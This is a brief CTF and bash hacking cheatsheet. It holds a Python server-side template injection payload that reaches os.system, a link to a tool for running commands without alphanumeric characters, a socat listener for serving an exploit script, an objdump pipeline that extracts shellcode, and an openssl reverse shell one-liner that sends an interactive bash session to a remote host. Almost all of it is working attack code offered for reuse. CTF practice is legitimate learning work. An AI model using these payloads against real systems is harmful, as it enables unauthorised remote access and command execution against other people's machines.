# Bash And CTF Cheatsheet

## Server Side Template Injection
```bash
{{ ().__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["os"].system('cat flag.txt') }}
```


## Bash Hack

### Bashfuck
Executing command without using alphanum characters

[BasFuck](https://github.com/trichimtrich/bashfuck)

### Socat

```bash
socat -d -d -d TCP4-LISTEN:1337,reuseaddr,fork EXEC:"python pwn.py" > /dev/null 2>&1 &
```

### Shellcode Extractor

```bash
objdump -d ./orww|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```
Source : [http://www.ilmuhacking.com/exploit/belajar-membuat-shellcode-part-1/](http://www.ilmuhacking.com/exploit/belajar-membuat-shellcode-part-1/) 

### Reverse SSL shell openssl - @ThemsonMester

```bash
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <HOST>:<PORT> > /tmp/s; rm /tmp/s
```